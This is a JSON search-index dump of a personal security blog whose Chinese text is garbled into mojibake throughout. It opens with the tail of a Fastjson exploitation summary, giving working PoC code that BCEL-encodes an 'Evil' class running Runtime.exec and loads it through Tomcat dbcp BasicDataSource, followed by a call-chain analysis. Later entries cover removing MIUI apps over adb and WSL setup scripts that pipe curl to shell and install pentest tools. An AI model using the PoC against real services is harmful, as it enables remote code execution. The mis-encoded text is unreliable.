\u003cartifactId\u003edbcp\u003c/artifactId\u003e \u003cversion\u003e6.0.53\u003c/version\u003e \u003c/dependency\u003e åœ¨Tomcat 8.0ä¹‹ååŒ…è·¯å¾„æœ‰æ‰€å˜åŒ–ï¼Œæ›´æ”¹ä¸ºäº† org.apache.tomcat.dbcp.dbcp2.BasicDataSourceï¼Œæ‰€ä»¥æ„é€ PoCçš„æ—¶å€™éœ€è¦æ³¨æ„ä¸€ä¸‹ã€‚ MVNä¾èµ–å†™æ³•å¦‚ä¸‹ï¼š \u003c!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.tomcat\u003c/groupId\u003e \u003cartifactId\u003etomcat-dbcp\u003c/artifactId\u003e \u003cversion\u003e9.0.8\u003c/version\u003e \u003c/dependency\u003e æˆ–è€…ç›´æ¥å»https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcpä¸‹è½½å¯¹åº”jaråŒ…å¯¼å…¥é¡¹ç›®å¤ç° ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:10:1","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"POCï¼š evil package com; import java.io.IOException; public class Evil { static { try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException e) { e.printStackTrace(); } } } poc package com; import com.alibaba.fastjson.JSON; import com.sun.org.apache.bcel.internal.Repository; import com.sun.org.apache.bcel.internal.classfile.JavaClass; import com.sun.org.apache.bcel.internal.classfile.Utility; import com.sun.org.apache.bcel.internal.util.ClassLoader; public class evilPoc { public static void main(String [] args) throws Exception{ JavaClass cls = Repository.lookupClass(Evil.class); String code = Utility.encode(cls.getBytes(),true); System.out.println(code); // new ClassLoader().loadClass(\"$$BCEL$$\" + code).newInstance(); String poc = \"{\\n\" + \" {\\n\" + \" \\\"x\\\":{\\n\" + \" \\\"@type\\\": \\\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\\\",\\n\" + \" \\\"driverClassLoader\\\": {\\n\" + \" \\\"@type\\\": \\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"\\n\" + \" },\\n\" + \" \\\"driverClassName\\\": \\\"$$BCEL$$\"+code+\"\\\"\\n\" + \" }\\n\" + \" }: \\\"x\\\"\\n\" + \"}\"; System.out.println(poc); JSON.parseObject(poc); } } ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:10:2","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"åˆ†æ BasicDataSourceçš„toString()æ–¹æ³•ä¼šéå†è¿™ä¸ªç±»çš„æ‰€æœ‰getterå¹¶æ‰§è¡Œï¼Œäºæ˜¯é€šè¿‡getConnection()-\u003ecreateDataSource()-\u003ecreateConnectionFactory()çš„è°ƒç”¨å…³ç³»ï¼Œè°ƒç”¨åˆ°äº†createConnectionFactoryæ–¹æ³•ï¼š protected ConnectionFactory createConnectionFactory() throws SQLException { // Load the JDBC driver class Driver driverToUse = this.driver; if (driverToUse == null) { Class\u003c?\u003e driverFromCCL = null; if (driverClassName != null) { try { try { if (driverClassLoader == null) { driverFromCCL = Class.forName(driverClassName); } else { driverFromCCL = Class.forName( driverClassName, true, driverClassLoader); } ... åœ¨createConnectionFactoryæ–¹æ³•ä¸­ï¼Œè°ƒç”¨äº†Class.forName(driverClassName, true, driverClassLoader) ã€‚æœ‰è¯»è¿‡æˆ‘çš„ã€ŠJavaå®‰å…¨æ¼«è°ˆã€‹ç¬¬ä¸€ç¯‡æ–‡ç« çš„åŒå­¦åº”è¯¥å¯¹Class.forNameè¿˜æœ‰å°è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°initial ä¸ºtrueæ—¶ï¼Œç±»åŠ è½½åå°†ä¼šç›´æ¥æ‰§è¡Œstatic{}å—ä¸­çš„ä»£ç ã€‚ å› ä¸ºdriverClassLoaderå’ŒdriverClassName éƒ½å¯ä»¥é€šè¿‡fastjsonæ§åˆ¶ï¼Œæ‰€ä»¥åªè¦æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„æ¶æ„ç±»å³å¯ï¼Œcom.sun.org.apache.bcel.internal.util.ClassLoaderï¼Œè¿™æ˜¯ä¸€ä¸ªç¥å¥‡çš„ClassLoaderï¼Œå› ä¸ºå®ƒä¼šç›´æ¥ä»classnameä¸­æå–Classçš„bytecodeæ•°æ®ã€‚ å¦‚æœ classname ä¸­åŒ…å«$$BCEL$$ï¼Œè¿™ä¸ª ClassLoader åˆ™ä¼šå°†$$BCEL$$ åé¢çš„å­—ç¬¦ä¸²æŒ‰ç…§BCELç¼–ç è¿›è¡Œè§£ç ï¼Œä½œä¸ºClassçš„å­—èŠ‚ç ï¼Œå¹¶è°ƒç”¨ defineClass() è·å– Class å¯¹è±¡ã€‚ äºæ˜¯æˆ‘ä»¬é€šè¿‡FastJsonååºåˆ—åŒ–ï¼Œååºåˆ—åŒ–ç”Ÿæˆä¸€ä¸ª org.apache.tomcat.dbcp.dbcp2.BasicDataSource å¯¹è±¡ï¼Œå¹¶å°†å®ƒçš„æˆå‘˜å˜é‡ classloader èµ‹å€¼ä¸º com.sun.org.apache.bcel.internal.util.ClassLoader å¯¹è±¡ï¼Œå°† classname èµ‹å€¼ä¸º ç»è¿‡BCELç¼–ç çš„å­—èŠ‚ç ï¼ˆå‡è®¾å¯¹åº”çš„ç±»ä¸ºEvil.classï¼‰ï¼Œæˆ‘ä»¬å°†éœ€è¦æ‰§è¡Œçš„ä»£ç å†™åœ¨ Evil.class çš„ static ä»£ç å—ä¸­å³å¯ã€‚ BCELç¼–ç å’Œè§£ç çš„æ–¹æ³•ï¼š import com.sun.org.apache.bcel.internal.classfile.Utility; ... String s = Utility.encode(data,true); byte[] bytes = Utility.decode(s, true); ... 0x04 å‚è€ƒ BCEL ClassLoaderå»å“ªäº†ï¼Ÿ xxlegend.com/2017/05/03/title- fastjson è¿œç¨‹ååºåˆ—åŒ–pocçš„æ„é€ å’Œåˆ†æ/ JavaåŠ¨æ€ç±»åŠ è½½ï¼Œå½“FastJsoné‡åˆ°å†…ç½‘ â€“ KINGX Fastjsonç³»åˆ—äºŒâ€”â€”1.2.22-1.2.24ååºåˆ—åŒ–æ¼æ´ [ Mi1k7ea ] Fastjsonå†å²è¡¥ä¸Bypassåˆ†æ Â· BlBanaâ€™s BlackHouse depycode/fastjson-local-echo: åŸºäºdbcpçš„fastjson rce å›æ˜¾ share/ppt/BlackHat USA 2021/us-21-Xing-How-I-Use-A-JSON-Deserialization.pdf (aliyuncs.com) ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:10:3","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["å…¶ä»–"],"content":"Adbå¸è½½æ‰‹æœºåŸè£…è½¯ä»¶ æˆ‘çš„æ‰‹æœºç³»ç»Ÿæ˜¯miui12.5ï¼Œå…¶ä»–æ‰‹æœºä¹Ÿç±»ä¼¼ ","date":"2022-02-01","objectID":"https://songzhiv.github.io/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/:0:0","tags":null,"title":"Adbå¸è½½æ‰‹æœºåŸè£…è½¯ä»¶","uri":"https://songzhiv.github.io/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/"},{"categories":["å…¶ä»–"],"content":"å‡†å¤‡ é¦–å…ˆä¸‹è½½google adbå·¥å…·å¹¶è§£å‹ è¿›å…¥å¼€å‘è€…æ¨¡å¼ã€‚miuiä¸­è¿›å…¥è®¾ç½®=ã€‹æˆ‘çš„****è®¾å¤‡=ã€‹å…¨éƒ¨å‚æ•°ã€‚è¿ç»­ç‚¹å‡»5ä¸‹miuiç‰ˆæœ¬è¿›å…¥å¼€å‘è€…æ¨¡å¼ã€‚ æ•°æ®çº¿é“¾æ¥ç”µè„‘ã€‚ å›åˆ°è®¾ç½®ä¸­æœç´¢æ¡†è¾“å…¥å¼€å‘è€…é€‰é¡¹ï¼Œç‚¹è¿›å»æ‰¾åˆ°USBè°ƒè¯•ï¼Œæ¥å—é£é™©æ‰“å¼€ã€‚ è¿›å…¥adbç›®å½•æ‰“å¼€cmdæˆ–è€…powershell è¾“å…¥.\\adb.exe shell æ˜¾ç¤ºä¸‹é¢è¿™æ ·å°±æˆåŠŸé“¾æ¥äº† ","date":"2022-02-01","objectID":"https://songzhiv.github.io/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/:1:0","tags":null,"title":"Adbå¸è½½æ‰‹æœºåŸè£…è½¯ä»¶","uri":"https://songzhiv.github.io/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/"},{"categories":["å…¶ä»–"],"content":"å¸è½½åƒåœ¾åº”ç”¨ å‘½ä»¤ ==pm uninstall â€“user 0 com.miui.systemAdSolution== æœ€åè·Ÿçš„æ˜¯åº”ç”¨çš„åŒ…åï¼ŒåŒ…åå¯ä»¥åœ¨åº”ç”¨ç®¡ç†ä¸­æŸ¥çœ‹ï¼Œæƒ³å¸è½½å“ªä¸ªåº”ç”¨å°±ç‚¹å¼€é‚£ä¸ªåº”ç”¨ï¼ŒæŠŠæœ€åçš„åŒ…åæ›¿æ¢å°±è¡Œäº†ã€‚successå°±è¡¨ç¤ºæˆåŠŸäº†ã€‚ ä¸‹é¢æ˜¯æˆ‘å¸è½½çš„åº”ç”¨ pm uninstall --user 0 com.miui.systemAdSolutionï¼ˆå°ç±³ç³»ç»Ÿå¹¿å‘Šè§£å†³æ–¹æ¡ˆï¼‰ pm uninstall --user 0 com.miui.analyticsï¼ˆå°ç±³å¹¿å‘Šåˆ†æï¼‰ pm uninstall --user 0 com.miui.personalassistantï¼ˆæ™ºèƒ½åŠ©ç†ï¼šæ—¢ä¸æ™ºèƒ½ï¼Œä¹Ÿä¸åŠ©ç†ï¼Œé™¤äº†å¡ï¼Œæ²¡åˆ«å“’ï¼‰ pm uninstall --user 0 com.miui.bugreport ï¼ˆbug åé¦ˆï¼šåé¦ˆäº†ä¹Ÿä¸ä¿®ï¼Œåé¦ˆä¸ªå•¥ï¼‰ pm uninstall --user 0 com.xiaomi.gamecenter.sdk.service ï¼ˆå°ç±³æ¸¸æˆä¸­å¿ƒæœåŠ¡ï¼‰ pm uninstall --user 0 com.xiaomi.gamecenter ï¼ˆå°ç±³æ¸¸æˆä¸­å¿ƒï¼‰ pm uninstall --user 0 com.miui.player ï¼ˆå°ç±³éŸ³ä¹ï¼šåƒåœ¾ï¼‰ pm uninstall --user 0 com.miui.video ï¼ˆå°ç±³è§†ï¼šåƒåœ¾ï¼‰ pm uninstall --user 0 com.android.email ï¼ˆé‚®ä»¶ï¼šåƒåœ¾ï¼‰ pm uninstall --user 0 com.miui.hybrid ï¼ˆæ··åˆå™¨ï¼‰ pm uninstall --user 0 com.android.browser ï¼ˆæµè§ˆå™¨ï¼šåƒåœ¾ï¼‰ pm uninstall --user 0 com.miui.yellowpage ï¼ˆé»„é¡µï¼‰ pm uninstall --user 0 com.xiaomi.midrop ï¼ˆå°ç±³å¿«ä¼ ï¼‰ pm uninstall --user 0 com.miui.virtualsim ï¼ˆå°ç±³è™šæ‹Ÿå™¨ï¼‰ pm uninstall --user 0 com.xiaomi.payment ï¼ˆå°ç±³æ”¯ä»˜ï¼šåƒåœ¾ï¼‰ pm uninstall --user 0 com.mipay.wallet ï¼ˆå°ç±³é’±åŒ…ï¼šåƒåœ¾ï¼‰ pm uninstall --user 0 com.android.soundrecorder ï¼ˆå½•éŸ³æœºï¼‰ pm uninstall --user 0 com.android.wallpaper ï¼ˆå£çº¸ï¼šå¸è½½å®ŒèƒŒæ™¯å°±æˆçº¯é»‘äº†ï¼Œå¤§å®¶åˆ«å­¦æˆ‘ï¼‰ pm uninstall --user 0 com.miui.voiceassist ï¼ˆè¯­éŸ³åŠ©æ‰‹ï¼‰ pm uninstall --user 0 com.miui.touchassistant ï¼ˆæ‚¬æµ®çƒï¼‰ pm uninstall --user 0 com.android.cellbroadcastreceiver ï¼ˆå°ç±³å¹¿æ’­ï¼‰ pm uninstall --user 0 com.xiaomi.mitunes ï¼ˆå°ç±³åŠ©æ‰‹ï¼‰ pm uninstall --user 0 com.xiaomi.pass ï¼ˆå°ç±³å¡åŒ…ï¼‰ pm uninstall --user 0 com.android.thememanager ï¼ˆä¸ªæ€§ä¸»é¢˜ç®¡ç†ï¼‰ pm uninstall --user 0 com.android.wallpaper ï¼ˆåŠ¨æ€å£çº¸ï¼‰ pm uninstall --user 0 com.android.wallpaper.livepicker ï¼ˆåŠ¨æ€å£çº¸è·å–ï¼‰ pm uninstall --user 0 com.miui.klo.bugreport ï¼ˆKLO bug åé¦ˆï¼‰ ç½‘ä¸Šè¯´ä¸‹é¢è¿™å››ä¸ªå¸è½½å®Œå°±å¼€ä¸äº†æœºäº†ï¼Œæˆ‘æ²¡æ•¢è¯•ã€‚æœ‰å…´è¶£çš„åŒå­¦ä¸å¦¨è¯•ä¸€ä¸‹ com.miui.cloudserviceï¼ˆå°ç±³äº‘æœåŠ¡ï¼‰ com.xiaomi.accountï¼ˆå°ç±³è´¦æˆ·ï¼‰ com.miui.cloudbackupï¼ˆäº‘å¤‡ä»½ï¼‰ com.xiaomi.marketï¼ˆåº”ç”¨å¸‚åœºï¼‰ ","date":"2022-02-01","objectID":"https://songzhiv.github.io/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/:2:0","tags":null,"title":"Adbå¸è½½æ‰‹æœºåŸè£…è½¯ä»¶","uri":"https://songzhiv.github.io/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/"},{"categories":["å…¶ä»–"],"content":"é…ç½® æ³¨ï¼šæœ¬æ–‡è„šæœ¬ä»…é€‚ç”¨äºwsl2ï¼Œä¸è¦åœ¨Ubuntuç›´æ¥è¿è¡Œã€‚ ","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:0:0","tags":null,"title":"ä¸ªäººé…ç½®","uri":"https://songzhiv.github.io/config/"},{"categories":["å…¶ä»–"],"content":"é‡å›Ubuntu ","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:1:0","tags":null,"title":"ä¸ªäººé…ç½®","uri":"https://songzhiv.github.io/config/"},{"categories":["å…¶ä»–"],"content":"æ¢æº sudo sed -i 's/archive.ubuntu.com/mirrors.ustc.edu.cn/g' /etc/apt/sources.list sudo apt update ","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:1:1","tags":null,"title":"ä¸ªäººé…ç½®","uri":"https://songzhiv.github.io/config/"},{"categories":["å…¶ä»–"],"content":"ä»£ç† https://zhuanlan.zhihu.com/p/108927713 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:1:2","tags":null,"title":"ä¸ªäººé…ç½®","uri":"https://songzhiv.github.io/config/"},{"categories":["å…¶ä»–"],"content":"è½¯ä»¶å®‰è£…ä¸é…ç½® ç»ˆç«¯ sudo apt install zsh sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" git clone --depth=1 https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions git clone --depth=1 https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting git clone --depth=1 https://github.com/zsh-users/zsh-completions ${ZSH_CUSTOM:=~/.oh-my-zsh/custom}/plugins/zsh-completions neovim sudo apt install -y neovim sudo apt autoremove vim sudo apt autoremove nano sh -c 'curl -fLo \"${XDG_DATA_HOME:-$HOME/.local/share}\"/nvim/site/autoload/plug.vim --create-dirs \\ https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim' mkdir ~/.config/nvim/ nvim ~/.config/nvim/init.vim curl -sL install-node.now.sh/lts | bash sudo apt-get install yarn :CocInstall coc-cmake coc-git coc-highlight coc-json coc-python coc-sh coc-snippets coc-syntax software sudo apt upgrade sudo apt install python2.7 sudo apt install python3-pip pip3 install -i https://mirrors.ustc.edu.cn/pypi/web/simple pip -U pip3 config set global.index-url https://mirrors.ustc.edu.cn/pypi/web/simple gitæŒ‚ä»£ç† git config --global http.https://github.com.proxy socks5://127.0.0.1:10808 git config --global http.https://github.com.proxy https://127.0.0.1:10809 git config --global https.https://github.com.proxy https://127.0.0.1:10809 git config --global --unset http.proxy git config --global --unset https.proxy export http_proxy=\"http://localhost:port\" export https_proxy=\"http://localhost:port\" alias setproxy=\"export ALL_PROXY=socks5://127.0.0.1:10808\" alias unsetproxy=\"unset ALL_PROXY\" docker curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - sudo add-apt-repository \\ \"deb [arch=amd64] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu \\ $(lsb_release -cs)\\ stable\" sudo apt update sudo apt install -y docker-ce ç”¨ç®¡ç†å‘˜æ‰“å¼€windows terminal sudo service docker start docker ps sudo vi /etc/docker/.json æ·»åŠ ============================= { \"registry-mirrors\": [\"https://docker.mirrors.ustc.edu.cn/\"] } pip3 install docker-compose sudo git clone --depth=1 https://github.com/maurosoria/dirsearch.git /opt/dirsearch sudo ln -sf /opt/dirsearch/dirsearch.py /usr/local/bin/dirsearch sudo git clone --depth=1 https://github.com/offensive-security/exploitdb.git /opt/exploitdb sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit sudo git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb \u003e msfinstall \u0026\u0026 \\ chmod 755 msfinstall \u0026\u0026 \\ ./msfinstall sudo apt install nmap sudo apt install hydra sudo git clone --depth=1 https://github.com/vulhub/vulhub.git ","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:2:0","tags":null,"title":"ä¸ªäººé…ç½®","uri":"https://songzhiv.github.io/config/"},{"categories":["å…¶ä»–"],"content":"init.vim call plug#begin('~/.config/vim_plug/plugged') Plug 'sainnhe/sonokai' Plug 'vim-python/python-syntax' Plug 'vim-airline/vim-airline' Plug 'vim-airline/vim-airline-themes' Plug 'luochen1990/rainbow' Plug 'preservim/nerdtree' Plug 'neoclide/coc.nvim', {'branch': 'release'} call plug#end() filetype plugin on filetype indent on set ambiwidth=double set showmatch \" é«˜äº®åŒ¹é…æ‹¬å· set ignorecase set clipboard+=unnamed set softtabstop=4 set shiftwidth=4 set nobackup set termguicolors set nu \"è®¾ç½®æ˜¾ç¤ºè¡Œå· syntax on \"è¯­æ³•æ£€æµ‹ set guicursor=i:block-iCursor-blinkon0,v:block-vCursor set autoindent set t_Co=256 set mouse=a set tabstop=4 set history=1000 set encoding=utf-8 let g:rainbow_active = 1 map \u003cTab\u003e :NERDTreeToggle\u003cCR\u003e nmap \u003cF12\u003e :SCCompileRun\u003ccr\u003e nnoremap \u003cF9\u003e :echo system('python2 \"' . expand('%') . '\"')\u003ccr\u003e nnoremap \u003cF10\u003e :echo system('python3 \"' . expand('%') . '\"')\u003ccr\u003e ","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:2:1","tags":null,"title":"ä¸ªäººé…ç½®","uri":"https://songzhiv.github.io/config/"},{"categories":["å…¶ä»–"],"content":".zshrc # If you come from bash you might have to change your $PATH. # export PATH=$HOME/bin:/usr/local/bin:$PATH # Path to your oh-my-zsh installation. export ZSH=\"/root/.oh-my-zsh\" # Set name of the theme to load --- if set to \"random\", it will # load a random theme each time oh-my-zsh is loaded, in which case, # to know which specific one was loaded, run: echo $RANDOM_THEME # See https://github.com/ohmyzsh/ohmyzsh/wiki/Themes ZSH_THEME=\"robbyrussell\" # Set list of themes to pick from when loading at random # Setting this variable when ZSH_THEME=random will cause zsh to load # a theme from this variable instead of looking in $ZSH/themes/ # If set to an empty array, this variable will have no effect. # ZSH_THEME_RANDOM_CANDIDATES=( \"robbyrussell\" \"agnoster\" ) # Uncomment the following line to use case-sensitive completion. # CASE_SENSITIVE=\"true\" # Uncomment the following line to use hyphen-insensitive completion. # Case-sensitive completion must be off. _ and - will be interchangeable. # HYPHEN_INSENSITIVE=\"true\" # Uncomment the following line to disable bi-weekly auto-update checks. # DISABLE_AUTO_UPDATE=\"true\" # Uncomment the following line to automatically update without prompting. # DISABLE_UPDATE_PROMPT=\"true\" # Uncomment the following line to change how often to auto-update (in days). # export UPDATE_ZSH_DAYS=13 # Uncomment the following line if pasting URLs and other text is messed up. # DISABLE_MAGIC_FUNCTIONS=\"true\" # Uncomment the following line to disable colors in ls. # DISABLE_LS_COLORS=\"true\" # Uncomment the following line to disable auto-setting terminal title. # DISABLE_AUTO_TITLE=\"true\" # Uncomment the following line to enable command auto-correction. # ENABLE_CORRECTION=\"true\" # Uncomment the following line to display red dots whilst waiting for completion. # COMPLETION_WAITING_DOTS=\"true\" # Uncomment the following line if you want to disable marking untracked files # under VCS as dirty. This makes repository status check for large repositories # much, much faster. # DISABLE_UNTRACKED_FILES_DIRTY=\"true\" # Uncomment the following line if you want to change the command execution time # stamp shown in the history command output. # You can set one of the optional three formats: # \"mm/dd/yyyy\"|\"dd.mm.yyyy\"|\"yyyy-mm-dd\" # or set a custom format using the strftime function format specifications, # see 'man strftime' for details. # HIST_STAMPS=\"mm/dd/yyyy\" # Would you like to use another custom folder than $ZSH/custom? # ZSH_CUSTOM=/path/to/new-custom-folder # Which plugins would you like to load? # Standard plugins can be found in $ZSH/plugins/ # Custom plugins may be added to $ZSH_CUSTOM/plugins/ # Example format: plugins=(rails git textmate ruby lighthouse) # Add wisely, as too many plugins slow down shell startup. plugins=( git zsh-syntax-highlighting zsh-completions zsh-autosuggestions z ) source $ZSH/oh-my-zsh.sh # User configuration # export MANPATH=\"/usr/local/man:$MANPATH\" # You may need to manually set your language environment # export LANG=en_US.UTF-8 # Preferred editor for local and remote sessions # if [[ -n $SSH_CONNECTION ]]; then # export EDITOR='vim' # else # export EDITOR='mvim' # fi # Compilation flags # export ARCHFLAGS=\"-arch x86_64\" # Set personal aliases, overriding those provided by oh-my-zsh libs, # plugins, and themes. Aliases can be placed here, though oh-my-zsh # users are encouraged to define aliases within the ZSH_CUSTOM folder. # For a full list of active aliases, run `alias`. # # Example aliases # alias zshconfig=\"mate ~/.zshrc\" # alias ohmyzsh=\"mate ~/.oh-my-zsh\" alias py=\"python\" alias py3=\"python3\" alias sqlmap=\"python /home/subv/sqlmap-dev/sqlmap.py\" alias docker=\"sudo docker\" alias dc=\"docker-compose\" alias setproxy=\"export ALL_PROXY=socks5://127.0.0.1:10808\" alias unsetproxy=\"unset ALL_PROXY\" ","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:2:2","tags":null,"title":"ä¸ªäººé…ç½®","uri":"https://songzhiv.github.io/config/"},{"categories":["å…¶ä»–"],"content":"install.sh vimæ‰“å¼€ :set ff=unix #!/bin/bash # cd ~/ sudo sed -i 's/archive.ubuntu.com/mirrors.ustc.edu.cn/g' /etc/apt/sources.list sudo apt update -y sudo apt install zsh python2.7 python3-pip neovim nmap hydra -y sudo apt autoremove vim nano -y pip3 install -i https://mirrors.ustc.edu.cn/pypi/web/simple pip -U pip3 config set global.index-url https://mirrors.ustc.edu.cn/pypi/web/simple sudo apt install python-dev -y curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - sudo add-apt-repository \\ \"deb [arch=amd64] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu \\ $(lsb_release -cs)\\ stable\" sudo apt update -y sudo apt install -y docker-ce pip3 install docker-compose sh -c 'curl -fLo \"${XDG_DATA_HOME:-$HOME/.local/share}\"/nvim/site/autoload/plug.vim --create-dirs \\ https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim' sudo mkdir ~/.config sudo mkdir ~/.config/nvim/ sudo mkdir /etc/docker/ sudo mv ~/config/daemon.json /etc/docker/ sudo mv ~/config/init.vim ~/.config/nvim/ sudo apt install nodejs -y sudo apt-get install yarn -y sudo apt upgrade -y vim +PlugInstall +qall sudo rm -rf ~/.oh-my-zsh/ sudo rm -rf ~/.zshrc sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" echo \"Do you want to set the git proxy(y/N)?\" read input if [[ $input = \"y\" ]] || [[ $input = \"Y\" ]]; then host_ip=$(cat /etc/resolv.conf |grep \"nameserver\" |cut -f 2 -d \" \") git config --global http.https://github.com.proxy socks5://$host_ip:10808 git config --global https.https://github.com.proxy socks5://$host_ip:10808 else echo \"you can use this command by youself: git config --global https.https://github.com.proxy https://host_ip:port\" fi sudo git clone --depth=1 https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions sudo git clone --depth=1 https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting sudo git clone --depth=1 https://github.com/zsh-users/zsh-completions ${ZSH_CUSTOM:=~/.oh-my-zsh/custom}/plugins/zsh-completions cat ~/config/zshrc \u003e\u003e .zshrc sudo git clone --depth=1 https://github.com/maurosoria/dirsearch.git /opt/dirsearch sudo ln -sf /opt/dirsearch/dirsearch.py /usr/local/bin/dirsearch sudo git clone --depth=1 https://github.com/offensive-security/exploitdb.git /opt/exploitdb sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit sudo git clone --depth=1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev sudo git clone --depth=1 https://github.com/vulhub/vulhub.git echo \"input :CocInstall coc-cmake coc-git coc-highlight coc-json coc-python coc-sh coc-snippets coc-syntax in the vim command\" echo \"=========================================\" echo \"=============Good, Enjoy it.=============\" echo \"=========================================\" ","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:2:3","tags":null,"title":"ä¸ªäººé…ç½®","uri":"https://songzhiv.github.io/config/"},{"categories":["å…¶ä»–"],"content":"WindowsTeminal // This file was initially generated by Windows Terminal Preview 1.5.3242.0 // It should still be usable in newer versions, but newer versions might have additional // settings, help text, or changes that you will not see unless you clear this file // and let us generate a new one for you. // To view the default settings, hold \"alt\" while clicking on the \"Settings\" button. // For documentation on these settings, see: https://aka.ms/terminal-documentation { \"$schema\": \"https://aka.ms/terminal-profiles-schema\", \"defaultProfile\": \"{2c4de342-38b7-51cf-b940-2309a097f518}\", \"initialCols\": 81, //ç»ˆç«¯çª—å£åˆå§‹å®½åº¦ \"initialRows\": 26, //ç»ˆç«¯çª—å£åˆå§‹é«˜åº¦ // You can add more global application settings here. // To learn more about global settings, visit https://aka.ms/terminal-global-settings // If enabled, selections are automatically copied to your clipboard. \"copyOnSelect\": false, // If enabled, formatted data is also copied to your clipboard \"copyFormatting\": false, // A profile specifies a command to execute paired with information about how it should look and feel. // Each one of them will appear in the 'New Tab' dropdown, // and can be invoked from the commandline with `wt.exe -p xxx` // To learn more about profiles, visit https://aka.ms/terminal-profile-settings \"profiles\": { \"defaults\": { // Put settings here that you want to apply to all profiles. }, \"list\": [ { \"guid\": \"{2c4de342-38b7-51cf-b940-2309a097f518}\", \"hidden\": false, \"name\": \"Ubuntu\", \"source\": \"Windows.Terminal.Wsl\", \"fontFace\" : \"monaco\", \"padding\" : \"5, 5, 5, 5\", \"suppressApplicationTitle\": true, \"tabTitle\": \"Ubuntu\", \"acrylicOpacity\": 0.7, \"useAcrylic\": true, \"acrylicOpacity\" : 0.70, \"cursorColor\": \"#4ab118\", //å…‰æ ‡é¢œè‰² \"fontSize\": 11, \"snapOnInput\" : true, \"cursorShape\": \"filledBox\", //å…‰æ ‡å½¢çŠ¶ \"commandline\": \"ubuntu\", \"colorScheme\" : \"Ubuntu\" }, { // Make changes here to the powershell.exe profile. \"guid\": \"{61c54bbd-c2c6-5271-96e7-009a87ff44bf}\", \"name\": \"Windows PowerShell\", \"commandline\": \"powershell.exe\", \"hidden\": false, \"fontFace\" : \"monaco\", \"hidden\": false, \"acrylicOpacity\": 0.7, \"useAcrylic\": true, \"colorScheme\" : \"AdventureTime\" }, { // Make changes here to the cmd.exe profile. \"guid\": \"{0caa0dad-35be-5f56-a8ff-afceeeaa6101}\", \"name\": \"å‘½ä»¤æç¤ºç¬¦\", \"commandline\": \"cmd.exe\", \"hidden\": false, \"fontFace\" : \"monaco\", \"padding\" : \"5, 5, 5, 5\", \"suppressApplicationTitle\": false, \"tabTitle\": \"CMD\", \"colorScheme\" : \"Ubuntu\", \"cursorColor\": \"#4ab118\", //å…‰æ ‡é¢œè‰² \"fontSize\": 11, \"snapOnInput\" : true, \"cursorShape\": \"filledBox\", \"startingDirectory\": \"D:\\\\Xray\", }, { \"guid\": \"{b453ae62-4e3d-5e58-b989-0a998ec441b8}\", \"hidden\": false, \"name\": \"Azure Cloud Shell\", \"source\": \"Windows.Terminal.Azure\" } ] }, // Add custom color schemes to this array. // To learn more about color schemes, visit https://aka.ms/terminal-color-schemes \"schemes\": [ { \"name\": \"Ubuntu\", \"black\": 